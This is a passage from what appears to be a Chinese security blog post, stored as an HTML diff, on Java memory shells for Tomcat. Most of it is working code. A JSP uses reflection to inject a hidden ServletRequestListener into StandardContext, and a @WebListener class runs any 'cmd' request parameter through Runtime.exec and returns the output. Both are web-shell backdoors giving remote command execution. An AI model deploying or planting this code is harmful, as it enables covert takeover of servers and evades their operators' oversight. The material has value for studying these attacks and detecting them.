class="line">    <span class="keyword">class</span> <span class="title class_">ListenerMemShell</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">            String cmd;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                cmd = sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">                org.apache.catalina.connector.<span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>).getDeclaredField(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line">                requestField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);  </span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>)&#123;  </span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();  </span><br><span class="line">                    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];  </span><br><span class="line">                    <span class="keyword">while</span> ((i=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;  </span><br><span class="line">                        response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));  </span><br><span class="line">                        response.getWriter().write(<span class="string">&quot;\r\n&quot;</span>);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">%&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;%  </span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);  </span><br><span class="line">  </span><br><span class="line">    Object[] objects = standardContext.getApplicationEventListeners();  </span><br><span class="line">    List&lt;Object&gt; listeners = Arrays.asList(objects);  </span><br><span class="line">    List&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(listeners);  </span><br><span class="line">    arrayList.add(<span class="keyword">new</span> <span class="title class_">ListenerMemShell</span>());  </span><br><span class="line">    standardContext.setApplicationEventListeners(arrayList.toArray());  </span><br><span class="line">  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783926239844-8936f2fe-82f1-419e-abe2-5591e897c181.png" alt="img"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Listener;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebListener</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerShell</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;  </span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest)servletRequestEvent.getServletRequest();  </span><br><span class="line"> <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> <span class="built_in">this</span>.getResponseFromRequest(req);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.CommandExec(cmd);  </span><br><span class="line"> resp.getWriter().println(result);  </span><br><span class="line"> System.out.println(<span class="string">&quot;部署完成&quot;</span>);  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">CommandExec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line"> <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> rt.exec(cmd);  </span><br><span class="line"> <span class="type">InputStream</span> <span class="variable">stderr</span> <span class="operator">=</span>  proc.getInputStream();  </span><br><span class="line"> <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(stderr);  </span><br><span class="line"> <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line"> <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();  </span><br><span class="line"> <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">            sb.append(line + <span class="string">&quot;\n&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="keyword">return</span> sb.toString();  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> HttpServletResponse <span class="title function_">getResponseFromRequest</span><span class="params">(HttpServletRequest var1)</span> &#123;  </span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">var3</span> <span class="operator">=</span> var1.getClass().getDeclaredField(<span class="string">&quot;response&quot;</span>);  </span><br><span class="line"> var3.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> var2 = (HttpServletResponse)var3.get(var1);  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception var8) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">var4</span> <span class="operator">=</span> var1.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line"> var4.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">Object</span> <span class="variable">var5</span> <span class="operator">=</span> var4.get(var1);  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getClass().getDeclaredField(<span class="string">&quot;response&quot;</span>);  </span><br><span class="line"> var6.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> var2 = (HttpServletResponse)var6.get(var5);  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception var7) &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> var2;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1783926316828-14a0ec99-9dfc-4b71-a15d-14d536356195.png" alt="img"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/08/06/Fastjson2-%E6%BC%8F%E6%B4%9E/" rel="prev" title="Fastjson2 漏洞">
+                  <i class="fa fa-angle-left"></i> Fastjson2 漏洞
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Hai0u</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
